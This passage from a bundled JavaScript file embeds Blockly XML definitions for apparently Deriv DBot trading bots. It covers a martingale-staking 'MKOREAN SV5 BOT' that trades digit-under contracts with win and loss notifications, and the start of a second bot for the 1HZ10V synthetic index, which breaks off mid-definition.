id=")BQi)0rq#by%[VkQAO-K">\n                                <field name="VAR" id="j}8O`Vs+RJljIwPu-_:_" variabletype="">YOUR STAKE</field>\n                              </block>\n                            </value>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="SUBMARKET">\n      <block type="controls_if" id=")F}I..~[%L?nLC*!UX!G">\n        <mutation else="1"></mutation>\n        <value name="IF0">\n          <block type="logic_compare" id="KCa0MY0ZcS[uVdJ*M^%-">\n            <field name="OP">EQ</field>\n            <value name="A">\n              <block type="variables_get" id="Wvl?K`WvsQsr;cZIn[bQ">\n                <field name="VAR" id="2%L3Rjj4.RqsTSPla6hf" variabletype="">Loss Count</field>\n              </block>\n            </value>\n            <value name="B">\n              <block type="math_number" id="43k*86t^hBUz4Ht-j1N@">\n                <field name="NUM">2</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="variables_set" id="0SO:h@vO=}xIr8gd19u3">\n            <field name="VAR" id="*~^il,R2A~%s$tI!hmw1" variabletype="">Next Trade Condition</field>\n            <value name="VALUE">\n              <block type="logic_boolean" id="ci33P?/#,-DROEp2]#G8">\n                <field name="BOOL">TRUE</field>\n              </block>\n            </value>\n            <next>\n              <block type="trade_definition_tradeoptions" id="}/dEXD7mPoja]BV[2mA-">\n                <mutation has_first_barrier="false" has_second_barrier="false" has_prediction="true"></mutation>\n                <field name="DURATIONTYPE_LIST">t</field>\n                <value name="DURATION">\n                  <block type="math_number" id="@`6$riwW}|$l2M}ND7Wa">\n                    <field name="NUM">1</field>\n                  </block>\n                </value>\n                <value name="AMOUNT">\n                  <block type="variables_get" id="Icfmq2zs]I%#%z|oWVtI">\n                    <field name="VAR" id="j}8O`Vs+RJljIwPu-_:_" variabletype="">YOUR STAKE</field>\n                  </block>\n                </value>\n                <value name="PREDICTION">\n                  <shadow type="math_number_positive" id="3MuO7yEsfrk_.$Pn(6FJ">\n                    <field name="NUM">1</field>\n                  </shadow>\n                  <block type="math_number" id="Th)ywv=NQ$2mHCrDN`~M">\n                    <field name="NUM">1</field>\n                  </block>\n                </value>\n              </block>\n            </next>\n          </block>\n        </statement>\n        <statement name="ELSE">\n          <block type="variables_set" id="sSpxFWpR[NNb*(nI%W!%">\n            <field name="VAR" id="*~^il,R2A~%s$tI!hmw1" variabletype="">Next Trade Condition</field>\n            <value name="VALUE">\n              <block type="logic_boolean" id="g.NZWZpN7Rcj9S@(%w$V">\n                <field name="BOOL">FALSE</field>\n              </block>\n            </value>\n            <next>\n              <block type="trade_definition_tradeoptions" id="eO`,$B(RYH,lmWQZak?%">\n                <mutation has_first_barrier="false" has_second_barrier="false" has_prediction="true"></mutation>\n                <field name="DURATIONTYPE_LIST">t</field>\n                <value name="DURATION">\n                  <block type="math_number" id="c(K@e[0dXJB`b:)}.{(}">\n                    <field name="NUM">1</field>\n                  </block>\n                </value>\n                <value name="AMOUNT">\n                  <block type="variables_get" id="Z#kN@[e3y.XAP-|I-}Fl">\n                    <field name="VAR" id="j}8O`Vs+RJljIwPu-_:_" variabletype="">YOUR STAKE</field>\n                  </block>\n                </value>\n                <value name="PREDICTION">\n                  <shadow type="math_number_positive" id="|.A39_:?R0KBC)PhNbO(">\n                    <field name="NUM">1</field>\n                  </shadow>\n                  <block type="math_number" id="ag:!$2RiW-58MqYfyeGf">\n                    <field name="NUM">1</field>\n                  </block>\n                </value>\n              </block>\n            </next>\n          </block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n  <block type="during_purchase" id="us;Q_7IWxRD*)n0H?s9$" x="956" y="60"></block>\n  <block type="after_purchase" id="VQ)T=0uKin7.[L,)${Sm" x="956" y="220">\n    <statement name="AFTERPURCHASE_STACK">\n      <block type="variables_set" id="nDp{t(UO3s|%nD),s~oZ">\n        <field name="VAR" id="QY=*3W:IirW]Cfm]YaSZ" variabletype="">Contract Detail Profit</field>\n        <value name="VALUE">\n          <block type="read_details" id="MrFJ+utkc(Rwtdc_8{[y">\n            <field name="DETAIL_INDEX">4</field>\n          </block>\n        </value>\n        <next>\n          <block type="controls_if" id="[;xGg|x6~f?P1eR%vF7P">\n            <mutation elseif="1" else="1"></mutation>\n            <value name="IF0">\n              <block type="contract_check_result" id="`sfw)7~NN+sGO(KdzEb,">\n                <field name="CHECK_RESULT">win</field>\n              </block>\n            </value>\n            <statement name="DO0">\n              <block type="text_join" id="Z9O}rt,TisN(RRHrpL@7">\n                <field name="VARIABLE" id="0UL{mRzO/~$S[(7*t)fz" variabletype="">text</field>\n                <statement name="STACK">\n                  <block type="text_statement" id="GC0k)^}XM6f/VOcn+d,v">\n                    <value name="TEXT">\n                      <shadow xmlns="https://developers.google.com/blockly/xml" type="text" id="pP(:.d0bWx$]Lga^B9=`">\n                        <field name="TEXT"/>\n                      </shadow>\n                      <block type="text" id="o3[9Dn~uRVPh`(6#9!UB">\n                        <field name="TEXT">✅✅✅</field>\n                      </block>\n                    </value>\n                  </block>\n                </statement>\n                <next>\n                  <block type="notify" id="x$={j*LYT45@t4g|P-+-">\n                    <field name="NOTIFICATION_TYPE">success</field>\n                    <field name="NOTIFICATION_SOUND">silent</field>\n                    <value name="MESSAGE">\n                      <block type="variables_get" id="81+./^,O)kgE|in#MQmr">\n                        <field name="VAR" id="0UL{mRzO/~$S[(7*t)fz" variabletype="">text</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="text_join" id="CfIi*,5;@A`~{#G%b3j+">\n                        <field name="VARIABLE" id="xkyECO0^diB!A_fJs1-." variabletype="">text1</field>\n                        <statement name="STACK">\n                          <block type="text_statement" id="NhrDqcYZmb*{BZc:uGk:">\n                            <value name="TEXT">\n                              <shadow xmlns="https://developers.google.com/blockly/xml" type="text" id="9WI4fw0bP=I?6$mZM-zD">\n                                <field name="TEXT"/>\n                              </shadow>\n                              <block type="text" id="}M]yqKk%_i/mZAIf!pl2">\n                                <field name="TEXT">\uD83D\uDE32 Wow A profit \uD83D\uDE00</field>\n                              </block>\n                            </value>\n                          </block>\n                        </statement>\n                        <next>\n                          <block type="notify" id="?dW6DCcLt1/6O;qj2n.4" collapsed="true">\n                            <field name="NOTIFICATION_TYPE">info</field>\n                            <field name="NOTIFICATION_SOUND">silent</field>\n                            <value name="MESSAGE">\n                              <block type="variables_get" id="jx}Z19FQH7pGqIr{ufHU">\n                                <field name="VAR" id="xkyECO0^diB!A_fJs1-." variabletype="">text1</field>\n                              </block>\n                            </value>\n                            <next>\n                              <block type="variables_set" id="tt3$IM-Vp]5xnD!AdYWm">\n                                <field name="VAR" id="j}8O`Vs+RJljIwPu-_:_" variabletype="">YOUR STAKE</field>\n                                <value name="VALUE">\n                                  <block type="variables_get" id="i?}Jd1}Hy_/puA7Zat_}">\n                                    <field name="VAR" id="%L?;380E6Lr^3b.%}t5Q" variabletype="">Win Amount</field>\n                                  </block>\n                                </value>\n                                <next>\n                                  <block type="variables_set" id="~5$L$lBV^dy*ZI:sJCNx" collapsed="true">\n                                    <field name="VAR" id="2%L3Rjj4.RqsTSPla6hf" variabletype="">Loss Count</field>\n                                    <value name="VALUE">\n                                      <block type="math_number" id="wQxJjr),Y%baMGI@+)Wm">\n                                        <field name="NUM">0</field>\n                                      </block>\n                                    </value>\n                                  </block>\n                                </next>\n                              </block>\n                            </next>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <value name="IF1">\n              <block type="contract_check_result" id="Yha2CYF3A/pGPUg+B1KO">\n                <field name="CHECK_RESULT">loss</field>\n              </block>\n            </value>\n            <statement name="DO1">\n              <block type="text_join" id="D7_-a/S)o4Td|}:38i#[">\n                <field name="VARIABLE" id="K3m#S.:R~K*DlNt9p-Ph" variabletype="">text2</field>\n                <statement name="STACK">\n                  <block type="text_statement" id="V^]QF`czP;8pM0;V2$LS">\n                    <value name="TEXT">\n                      <shadow xmlns="https://developers.google.com/blockly/xml" type="text" id="H;*}B)*d})O@6EiQ[+m8">\n                        <field name="TEXT"/>\n                      </shadow>\n                      <block type="text" id="+~]4okm^CVLn]LMtb2Y|">\n                        <field name="TEXT">Oops \uD83E\uDD2B It\'s a loss</field>\n                      </block>\n                    </value>\n                  </block>\n                </statement>\n                <next>\n                  <block type="notify" id="5byq4=`@S5MwEr_R}+Ea">\n                    <field name="NOTIFICATION_TYPE">error</field>\n                    <field name="NOTIFICATION_SOUND">silent</field>\n                    <value name="MESSAGE">\n                      <block type="variables_get" id="Wf%RZ*D+csKqBs]hd[!a">\n                        <field name="VAR" id="K3m#S.:R~K*DlNt9p-Ph" variabletype="">text2</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="text_join" id="Vt:9/:S/0F?ZQr~kbM6F">\n                        <field name="VARIABLE" id="Ee@Y|9KoB74OGfm~dVo6" variabletype="">text3</field>\n                        <statement name="STACK">\n                          <block type="text_statement" id="U5xM;JLQlF+|uo[JAk[x">\n                            <value name="TEXT">\n                              <shadow xmlns="https://developers.google.com/blockly/xml" type="text" id="{pEJ-v/G5(nT#8iyB^-m">\n                                <field name="TEXT"/>\n                              </shadow>\n                              <block type="text" id="_1@3OC?rE;Qg;NN93CBT">\n                                <field name="TEXT">MKOREAN SV5 BOT </field>\n                              </block>\n                            </value>\n                          </block>\n                        </statement>\n                        <next>\n                          <block type="notify" id="TXWz?SiDmJqM4;*DFOiO" collapsed="true">\n                            <field name="NOTIFICATION_TYPE">info</field>\n                            <field name="NOTIFICATION_SOUND">silent</field>\n                            <value name="MESSAGE">\n                              <block type="variables_get" id="ou4q3wQN=idf]ce~Ev+]">\n                                <field name="VAR" id="Ee@Y|9KoB74OGfm~dVo6" variabletype="">text3</field>\n                              </block>\n                            </value>\n                            <next>\n                              <block type="math_change" id="$X*SlM1zbT-]OmYWR_^X">\n                                <field name="VAR" id="2%L3Rjj4.RqsTSPla6hf" variabletype="">Loss Count</field>\n                                <value name="DELTA">\n                                  <shadow xmlns="https://developers.google.com/blockly/xml" type="math_number" id="Rc#t~yX(1Jyt8L4egvZk">\n                                    <field name="NUM">1</field>\n                                  </shadow>\n                                  <block type="math_number" id="u^mPL@XH?XT,N[TCVPx?">\n                                    <field name="NUM">1</field>\n                                  </block>\n                                </value>\n                                <next>\n                                  <block type="math_change" id="?PDFpW[sqebNTLsFk_SS" collapsed="true">\n                                    <field name="VAR" id="j}8O`Vs+RJljIwPu-_:_" variabletype="">YOUR STAKE</field>\n                                    <value name="DELTA">\n                                      <shadow xmlns="https://developers.google.com/blockly/xml" type="math_number" id="|w])o|M_$R-z+WnRiHnc">\n                                        <field name="NUM">1</field>\n                                      </shadow>\n                                      <block type="math_arithmetic" id="R8{.,8/%UMsTJ1(=x+%K">\n                                        <field name="OP">MULTIPLY</field>\n                                        <value name="A">\n                                          <shadow xmlns="https://developers.google.com/blockly/xml" type="math_number" id="k@P_8v@HNf]4kS:^slO{">\n                                            <field name="NUM">1</field>\n                                          </shadow>\n                                          <block type="math_single" id="[RZi:)a=(bR9X!J_|WzT">\n                                            <field name="OP">ABS</field>\n                                            <value name="NUM">\n                                              <shadow xmlns="https://developers.google.com/blockly/xml" type="math_number" id="j@GG_7Pj]t+4$VZ[d1wP">\n                                                <field name="NUM">9</field>\n                                              </shadow>\n                                              <block type="read_details" id="U,(a4L$sDlTHhmzn4r~!">\n                                                <field name="DETAIL_INDEX">4</field>\n                                              </block>\n                                            </value>\n                                          </block>\n                                        </value>\n                                        <value name="B">\n                                          <shadow xmlns="https://developers.google.com/blockly/xml" type="math_number" id="[?5PvJ9li[+DngMf`qiq">\n                                            <field name="NUM">1</field>\n                                          </shadow>\n                                          <block type="math_arithmetic" id="*Nb_HVv72M_d1~V#%wkO">\n                                            <field name="OP">MINUS</field>\n                                            <value name="A">\n                                              <shadow xmlns="https://developers.google.com/blockly/xml" type="math_number" id="I*i]`TsjQd12M=:i{r+d">\n                                                <field name="NUM">1</field>\n                                              </shadow>\n                                              <block type="variables_get" id="2~k%E;BWdD}M]v2zs~He">\n                                                <field name="VAR" id="r;j5hdLRm`b6LFCDue7-" variabletype="">SET YOUR MARTINGALE</field>\n                                              </block>\n                                            </value>\n                                            <value name="B">\n                                              <shadow xmlns="https://developers.google.com/blockly/xml" type="math_number" id="gdmrAGcEt#!`mD(v}dh~">\n                                                <field name="NUM">1</field>\n                                              </shadow>\n                                              <block type="math_number" id="Qs0TMct={1j*o8lxe233">\n                                                <field name="NUM">1</field>\n                                              </block>\n                                            </value>\n                                          </block>\n                                        </value>\n                                      </block>\n                                    </value>\n                                  </block>\n                                </next>\n                              </block>\n                            </next>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <statement name="ELSE">\n              <block type="variables_set" id="A0C|d(JexQ~c|D3YZiaB">\n                <field name="VAR" id="2%L3Rjj4.RqsTSPla6hf" variabletype="">Loss Count</field>\n                <value name="VALUE">\n                  <block type="math_number" id="gH/*VV8-W5NSejD^R]0{">\n                    <field name="NUM">0</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="2il4}!D+wJvjj~V/*.~A">\n                    <field name="VAR" id="j}8O`Vs+RJljIwPu-_:_" variabletype="">YOUR STAKE</field>\n                    <value name="VALUE">\n                      <block type="variables_get" id="OTpjzu$.VliWTiU~IR(d">\n                        <field name="VAR" id="j}8O`Vs+RJljIwPu-_:_" variabletype="">YOUR STAKE</field>\n                      </block>\n                    </value>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <next>\n              <block type="controls_if" id="QmD9;uB(%xK{oSGUc^9+">\n                <mutation elseif="1" else="1"></mutation>\n                <value name="IF0">\n                  <block type="logic_compare" id="c[`rt]ieGkR7yk++^C#R">\n                    <field name="OP">EQ</field>\n                    <value name="A">\n                      <block type="variables_get" id="e|grh*?2-$^~;*XkrJws" collapsed="true">\n                        <field name="VAR" id="2%L3Rjj4.RqsTSPla6hf" variabletype="">Loss Count</field>\n                      </block>\n                    </value>\n                    <value name="B">\n                      <block type="math_number" id="7*~nxSx@q^z$DFwaM#uh">\n                        <field name="NUM">10</field>\n                      </block>\n                    </value>\n                  </block>\n                </value>\n                <statement name="DO0">\n                  <block type="notify" id="itfxZaFCB35go]rgP2N,">\n                    <field name="NOTIFICATION_TYPE">success</field>\n                    <field name="NOTIFICATION_SOUND">silent</field>\n                    <value name="MESSAGE">\n                      <shadow type="text" id="B!G92k;[4FB|4DWAFW^T">\n                        <field name="TEXT">abc</field>\n                      </shadow>\n                    </value>\n                    <next>\n                      <block type="text_join" id="c{rhdE*Pdlvk8bh;$wVi">\n                        <field name="VARIABLE" id="Nu45/qB+9Ke$!A8Y%N|a" variabletype="">Ops!Sl hit</field>\n                        <statement name="STACK">\n                          <block type="text_statement" id=",IK*8O?ZhMoc;`A~cWFj">\n                            <value name="TEXT">\n                              <shadow xmlns="https://developers.google.com/blockly/xml" type="text" id="m9g-OD{bTeZB!K*^+mUu">\n                                <field name="TEXT"/>\n                              </shadow>\n                              <block type="text" id="!`%3jVrZ,mM=b!VMUe*`">\n                                <field name="TEXT">OPS!Sl hit</field>\n                              </block>\n                            </value>\n                            <next>\n                              <block type="text_statement" id="Uop_!+;RWggw~v4nh%64">\n                                <value name="TEXT">\n                                  <shadow xmlns="https://developers.google.com/blockly/xml" type="text" id="NLON];!yS44FdEv@`8iu">\n                                    <field name="TEXT"/>\n                                  </shadow>\n                                  <block type="text" id="47AR5YE1T.Uv|9_=VcN?" collapsed="true">\n                                    <field name="TEXT">                                               Loss Amount\uD83D\uDE1E ::: USD </field>\n                                  </block>\n                                </value>\n                                <next>\n                                  <block type="text_statement" id="5R}8Sp;jzvD+q.~7_Nxs">\n                                    <value name="TEXT">\n                                      <shadow xmlns="https://developers.google.com/blockly/xml" type="text" id="jvli55G./ne:(T4AoNE6">\n                                        <field name="TEXT"/>\n                                      </shadow>\n                                      <block type="total_profit" id="I!/I0`772[t?Sn.,1u-B"></block>\n                                    </value>\n                                  </block>\n                                </next>\n                              </block>\n                            </next>\n                          </block>\n                        </statement>\n                        <next>\n                          <block type="text_print" id="?VxM]kV/~g~`:/?`pXJx">\n                            <value name="TEXT">\n                              <shadow xmlns="https://developers.google.com/blockly/xml" type="text" id="B/$(2jI(@(sS|@X5[z?v">\n                                <field name="TEXT">abc</field>\n                              </shadow>\n                              <block type="variables_get" id="E35)?lr4@*nuak~07FNP">\n                                <field name="VAR" id="Nu45/qB+9Ke$!A8Y%N|a" variabletype="">Ops!Sl hit</field>\n                              </block>\n                            </value>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </statement>\n                <value name="IF1">\n                  <block type="logic_operation" id=")0aig+lcJQ5@YS(-h_!=">\n                    <field name="OP">AND</field>\n                    <value name="A">\n                      <block type="math_number_property" id="ho(.aS[Fw~IW3~$9~W1x">\n                        <mutation divisor_input="false"></mutation>\n                        <field name="PROPERTY">POSITIVE</field>\n                        <value name="NUMBER_TO_CHECK">\n                          <shadow xmlns="https://developers.google.com/blockly/xml" type="math_number" id="`SniyC+G_o@Q?bNHxR0M">\n                            <field name="NUM">0</field>\n                          </shadow>\n                          <block type="total_profit" id="%wiBB9iDB+whg`VU+V;3"></block>\n                        </value>\n                      </block>\n                    </value>\n                    <value name="B">\n                      <block type="logic_compare" id="P;l..0H*-{M6sR{1rE*t">\n                        <field name="OP">GTE</field>\n                        <value name="A">\n                          <block type="math_single" id="vjh;O1ac0Sy*um1kSq5g">\n                            <field name="OP">ABS</field>\n                            <value name="NUM">\n                              <shadow xmlns="https://developers.google.com/blockly/xml" type="math_number" id="*%g6wFOgNYQ[?}Hroqc.">\n                                <field name="NUM">9</field>\n                              </shadow>\n                              <block type="total_profit" id=".o+jr1Ds2g@l$20bO0~k"></block>\n                            </value>\n                          </block>\n                        </value>\n                        <value name="B">\n                          <block type="variables_get" id="6CW%u=Vl-Gv3x:.pf.0(">\n                            <field name="VAR" id="mXtFswo{p,|%W1:V-$+r" variabletype="">TARGET PROFIT</field>\n                          </block>\n                        </value>\n                      </block>\n                    </value>\n                  </block>\n                </value>\n                <statement name="DO1">\n                  <block type="notify" id="A4ArX=7=zTL+2VDZGLtH" collapsed="true">\n                    <field name="NOTIFICATION_TYPE">success</field>\n                    <field name="NOTIFICATION_SOUND">job-done</field>\n                    <value name="MESSAGE">\n                      <shadow type="text" id="+2Ccj^M;rr2lTZ~=oW--">\n                        <field name="TEXT">abc</field>\n                      </shadow>\n                    </value>\n                    <next>\n                      <block type="text_join" id="{Bu!dm#epw?OGnmLp(vS">\n                        <field name="VARIABLE" id="Eujnw%N@9L.H.r),7#zV" variabletype="">Tp hitted</field>\n                        <statement name="STACK">\n                          <block type="text_statement" id="n;dZb{nG~N9I-oZ^MPkP">\n                            <value name="TEXT">\n                              <shadow xmlns="https://developers.google.com/blockly/xml" type="text" id="1zWE=V#z{Ts17ABv~_c)">\n                                <field name="TEXT"/>\n                              </shadow>\n                              <block type="text" id="./w3wd5Z%$rGdDmb]5qz">\n                                <field name="TEXT">Hi User Tp hitted </field>\n                              </block>\n                            </value>\n                            <next>\n                              <block type="text_statement" id="6jWeh~}},^,?f?LxZ)*D">\n                                <value name="TEXT">\n                                  <shadow xmlns="https://developers.google.com/blockly/xml" type="text" id="APRtp?(}},ibk,vPS?Y_">\n                                    <field name="TEXT"/>\n                                  </shadow>\n                                  <block type="text" id="J9=AZT3iv![XFz0?{RtV" collapsed="true">\n                                    <field name="TEXT">                                                Win Amount✅ ::: USD </field>\n                                  </block>\n                                </value>\n                                <next>\n                                  <block type="text_statement" id="|[-pKchV:~/dVnC4#?-C">\n                                    <value name="TEXT">\n                                      <shadow xmlns="https://developers.google.com/blockly/xml" type="text" id="v)U_R$U02.VrN9so-A%*">\n                                        <field name="TEXT"/>\n                                      </shadow>\n                                      <block type="total_profit" id="4oSKD`f4%6fNC_Y)1*aN"></block>\n                                    </value>\n                                  </block>\n                                </next>\n                              </block>\n                            </next>\n                          </block>\n                        </statement>\n                        <next>\n                          <block type="text_print" id=")cWROjpsPuh]1tMIbetO">\n                            <value name="TEXT">\n                              <shadow xmlns="https://developers.google.com/blockly/xml" type="text" id="oztc:Efd-n[Hb$_678vH">\n                                <field name="TEXT">abc</field>\n                              </shadow>\n                              <block type="variables_get" id="CxEduJ]+:~M{29bIkVL4">\n                                <field name="VAR" id="Eujnw%N@9L.H.r),7#zV" variabletype="">Tp hitted</field>\n                              </block>\n                            </value>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </statement>\n                <statement name="ELSE">\n                  <block type="trade_again" id="uR1,V_Un2|]q5k}j[1Zk"></block>\n                </statement>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n  </block>\n  <block type="before_purchase" id=".IMlpMO@?on^Fth!uc{h" deletable="false" x="0" y="1188">\n    <statement name="BEFOREPURCHASE_STACK">\n      <block type="controls_if" id=";y@TDg|SK^5N!lCN-]bF" collapsed="true">\n        <mutation else="1"></mutation>\n        <value name="IF0">\n          <block type="logic_compare" id="P7[#?Zts[%8#]w$n*V[Q">\n            <field name="OP">EQ</field>\n            <value name="A">\n              <block type="variables_get" id="WpNJQVC,_o%l-tp0aq$i">\n                <field name="VAR" id="*~^il,R2A~%s$tI!hmw1" variabletype="">Next Trade Condition</field>\n              </block>\n            </value>\n            <value name="B">\n              <block type="logic_boolean" id="GTu]c8w{G)MH=!}81DE[">\n                <field name="BOOL">TRUE</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="apollo_purchase" id="|fCIz:`m`HI#,LWJduMA">\n            <field name="PURCHASE_LIST">DIGITUNDER</field>\n          </block>\n        </statement>\n        <statement name="ELSE">\n          <block type="apollo_purchase" id="{=c7$W}k#BS|e2@roK9#">\n            <field name="PURCHASE_LIST">DIGITUNDER</field>\n          </block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n</xml>'
            },
            40696: function(e, t, n) {
                "use strict";
                n.r(t), n.d(t, {
                    default: function() {
                        return a
                    }
                });
                let a = '<xml xmlns="http://www.w3.org/1999/xhtml" is_dbot="true" collection="false">\n  <variables>\n    <variable type="" id="o!-=j_eJZCfW(+iV7;MS" islocal="false" iscloud="false">Tick 1</variable>\n    <variable type="" id="7Q4y$nr_sr!x2NkOu%)2" islocal="false" iscloud="false">Stake</variable>\n    <variable type="" id="b~M_gc!6d^tXHe/]?+}`" islocal="false" iscloud="false">Tick 2</variable>\n    <variable type="" id=":Z8WvPXWG?qCe|8=iii1" islocal="false" iscloud="false">Expected Profit</variable>\n    <variable type="" id="S10~wx4EJ/w3gZZ;v77Y" islocal="false" iscloud="false">Total Lost</variable>\n    <variable type="" id="!}o95im:dfosc$6[v%LW" islocal="false" iscloud="false">Tick 3</variable>\n    <variable type="" id="~ZEk9Zr7t[g;-`afIGOO" islocal="false" iscloud="false">Initial Stake</variable>\n    <variable type="" id="L.cN$B-UUzkS|eDQm2xZ" islocal="false" iscloud="false">Stop Loss</variable>\n    <variable type="" id="Op-Cim@t?DJN?i;G)w)C" islocal="false" iscloud="false">Count Loss</variable>\n    <variable type="" id="S|AWDr;xbKU_pbl(^]^B" islocal="false" iscloud="false">Tick 4</variable>\n    <variable type="" id="!mQjsA[]viO$7Gu~UzUn" islocal="false" iscloud="false">Martingale Split</variable>\n    <variable type="" id="VK7:nSRSXJ=|#p(oAU9v" islocal="false" iscloud="false">Payout %</variable>\n    <variable type="" id="icmJXVK=|*WSXkYEU*E;" islocal="false" iscloud="false">text</variable>\n    <variable type="" id="Y$cG[}L|(_T-=;0ZyXI." islocal="false" iscloud="false">text1</variable>\n    <variable type="" id="$+Q3~hzlFiI[$SMrBNB?" islocal="false" iscloud="false">Prediction</variable>\n    <variable type="" id="+L:nET.PS2OXV5VNGInM" islocal="false" iscloud="false">Analysis</variable>\n    <variable type="" id="2/ozQp|pSBT9oqJ(u7uu" islocal="false" iscloud="false">Entrypoint</variable>\n    <variable type="" id="sF6($OTq!BVWswgj}4|S" islocal="false" iscloud="false">Prediction before loss</variable>\n    <variable type="" id="OPb$Wwph1|)^r0#|^^y}" islocal="false" iscloud="false">Prediction after loss</variable>\n    <variable type="" id="x`Ia+qCu@StiaJI^X([4" islocal="false" iscloud="false">Entrypoint-Digit</variable>\n  </variables>\n  <block type="trade_definition" id="deUzn(1}F)X6;d+O#$A8" deletable="false" x="0" y="60">\n    <statement name="TRADE_OPTIONS">\n      <block type="trade_definition_market" id="*ZjSt,1/{;THl;IV%*sy" deletable="false" movable="false">\n        <field name="MARKET_LIST">synthetic_index</field>\n        <field name="SUBMARKET_LIST">random_index</field>\n        <field name="SYMBOL_LIST">1HZ10V</field>\n        <next>\n          <block type="trade_definition_tradetype" id="xzc0Sl`,#G4h{;usN50T" deletable="false" movable="false">\n            <field name="TRADETYPECAT_LIST">digits</field>\n            <field name="TRADETYPE_LIST">overunder</field>\n            <next>\n              <block type="trade_definition_contracttype" id="z9892C3%qM2{aa@jy]2]" deletable="false" movable="false">\n                <field name="TYPE_LIST">DIGITUNDER</field>\n                <next>\n                  <block type="trade_definition_candleinterval" id=";)B,zZH~+e,96QvZt*7;" deletable="false" movable="false">\n                    <field name="CANDLEINTERVAL_LIST">60</field>\n                    <next>\n                      <block type="trade_definition_restartbuysell" id="5E?,-;gq5Qu_eyIs.)m!" deletable="false" movable="false">\n                        <field name="TIME_MACHINE_ENABLED">FALSE</field>\n                        <next>\n                          <block type="trade_definition_restartonerror" id="?u~0^reDb~fVp[b-~w|G" deletable="false" movable="false">\n                            <field name="RESTARTONERROR">TRUE</field>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="INITIALIZATION">\n      <block type="variables_set" id="4$5m(H*{`c4#S-)o=;aV">\n        <field name="VAR" id="sF6($OTq!BVWswgj}4|S" variabletype="">Prediction before loss</field>\n        <value name="VALUE">\n          <block type="math_number" id="Ai5]{:#d~w;]%q`:p[h,">\n            <field name="NUM">9</field>\n          </block>\n        </value>\n        <next>\n          <block type="variables_set" id="f;c!1^-bb9K7rQ{#3/l0">\n            <field name="VAR" id="OPb$Wwph1|)^r0#|^^y}" variabletype="">Prediction after loss</field>\n            <value name="VALUE">\n              <block type="math_number" id="gT6?xbULKjs8^Sw?0iH%">\n                <field name="NUM">6</field>\n              </block>\n            </value>\n            <next>\n              <block type="variables_set" id="_aSBe^/).nS{bwLbiE9n">\n                <field name="VAR" id="x`Ia+qCu@StiaJI^X([4" variabletype="">Entrypoint-Digit</field>\n                <value name="VALUE">\n                  <block type="math_number" id="KR2=c$XO!b_Bgl_ASR4(">\n                    <field name="NUM">7</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="y-?,og][*D.g)z`wz~sr">\n                    <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2" variabletype="">Stake</field>\n                    <value name="VALUE">\n                      <block type="math_number" id="!TI[pk;TXnU%n?K/nH:^">\n                        <field name="NUM">1</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="variables_set" id="9.jN~btog59cUwf8:lPl">\n                        <field name="VAR" id=":Z8WvPXWG?qCe|8=iii1" variabletype="">Expected Profit</field>\n                        <value name="VALUE">\n                          <block type="math_number" id=".`(0weVv%;N,|MA`*;Ll">\n                            <field name="NUM">100</field>\n                          </block>\n                        </value>\n                        <next>\n                          <block type="variables_set" id="MpN0,W8A;joH2n#IXF@!">\n                            <field name="VAR" id="L.cN$B-UUzkS|eDQm2xZ" variabletype="">Stop Loss</field>\n                            <value name="VALUE">\n                              <block type="math_number" id="tACLVvalL.#)Xxz`ZoBC">\n                                <field name="NUM">1000</field>\n                              </block>\n                            </value>\n                            <next>\n                              <block type="variables_set" id="-z^omJLEhT5`I:NZ;J=-" collapsed="true">\n                                <field name="VAR" id="~ZEk9Zr7t[g;-`afIGOO" variabletype="">Initial Stake</field>\n                                <value name="VALUE">\n                                  <block type="variables_get" id="SoAC,+VI6PpU1=/|ThHQ">\n                                    <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2" variabletype="">Stake</field>\n                                  </block>\n                                </value>\n                                <next>\n                                  <block type="variables_set" id=":y8AYtv{x`8LFslg8@Pc" collapsed="true">\n                                    <field name="VAR" id="!mQjsA[]viO$7Gu~UzUn" variabletype="">Martingale Split</field>\n                                    <value name="VALUE">\n                                      <block type="math_number" id="LqV%S=;Xlb|o9}weJjz1">\n                                        <field name="NUM">2.55</field>\n                                      </block>\n                                    </value>\n                                    <next>\n                                      <block type="variables_set" id="7A:2S/;VFh?W0fI|W^{]" collapsed="true">\n                                        <field name="VAR" id="VK7:nSRSXJ=|#p(oAU9v" variabletype="">Payout %</field>\n                                        <value name="VALUE">\n                                          <block type="math_number" id="*nsC7E`vh$_)]~v1u.#[">\n                                            <field name="NUM">39</field>\n                                          </block>\n                                        </value>\n                                        <next>\n                                          <block type="variables_set" id="i-+y35ET%iNI#gfE=j}f" collapsed="true">\n                                            <field name="VAR" id="$+Q3~hzlFiI[$SMrBNB?" variabletype="">Prediction</field>\n                                            <value name="VALUE">\n                                              <block type="variables_get" id="lz5.rXO5Nim{3$+J{lQc">\n                                                <field name="VAR" id="sF6($OTq!BVWswgj}4|S" variabletype="">Prediction before loss</field>\n                                              </block>\n                                            </value>\n                                            <next>\n                                              <block type="variables_set" id="8pGcw{d^D[X~Q9WWr9L$" collapsed="true">\n                                                <field name="VAR" id="+L:nET.PS2OXV5VNGInM" variabletype="">Analysis</field>\n                                                <value name="VALUE">\n                                                  <block type="text" id="CSPjU%E/2Z*fs-7r2@%|">\n                                                    <field 